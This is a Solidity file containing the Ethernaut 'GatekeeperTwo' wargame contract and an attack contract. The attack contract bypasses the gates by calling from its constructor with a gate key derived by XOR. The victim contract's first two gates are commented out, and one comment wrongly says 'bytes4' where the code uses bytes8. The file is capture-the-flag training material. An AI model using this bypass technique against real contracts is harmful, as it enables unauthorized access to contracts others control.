pragma solidity ^0.4.24;


contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    // require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    // uint x;
    // assembly { x := extcodesize(caller) }
    // require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}



contract GatekeeperTwoAttack {

    GatekeeperTwo victim;

    //the victim's gates are exploitable:
    //gate1 = requires that the victim is called from a contract
    //gate2 = requires that the victim is called from a contructor (on deployment)
    //gate3 = requires that gateKey is the bytes4 of the XOR of uint64(keccak256(msg.sender)) and uint64(0) - 1)
    constructor(address _victim) public {
        victim = GatekeeperTwo(_victim);
        //msg.sender must be this (new) contract, otherwise gatekey value is wrong
        bytes8 key = bytes8(uint64(keccak256(address(this))) ^ uint64(0) - 1);
        victim.enter(key);
    }

}
